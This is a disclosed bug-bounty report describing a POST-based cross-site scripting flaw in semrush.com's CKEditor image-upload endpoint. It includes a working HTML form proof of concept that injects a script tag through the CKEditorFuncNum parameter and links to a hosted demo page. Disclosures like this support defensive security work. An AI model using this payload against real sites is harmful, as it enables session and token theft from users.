# Post Based XSS On Upload Via CK Editor [semrush.com]

## Report Details
- **Report ID**: 375352
- **URL**: https://hackerone.com/reports/375352
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-07-02T13:44:12.140Z
- **Disclosed**: 2018-08-17T13:08:41.729Z

## Reporter
- **Username**: apapedulimu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
**Summary:** 
XSS Via Post Method When Upload via CKEditor

**Description:** 
This XSS is execute by error message when upload some image on 

```
https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=0&langCode=en
```

## Browsers Verified In:

  * Firefox

## Steps To Reproduce:

- This is POST based XSS, need some csrf to trigger the xss
- Create .html code like : 

```
<html>
  <body>
    <form action="https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
- and click the submit request 
- Or go to http://labs.apapedulimu.click/xss-semrush.html 

## Supporting Material/References:
{F314582}

## Impact

XSS Will be execute it when user click that button, and attacker can stole user token, IP & etc.

Regards,
Apapedulimu

## Attachments
- Screen_Shot_2018-07-02_at_8.38.55_PM.png
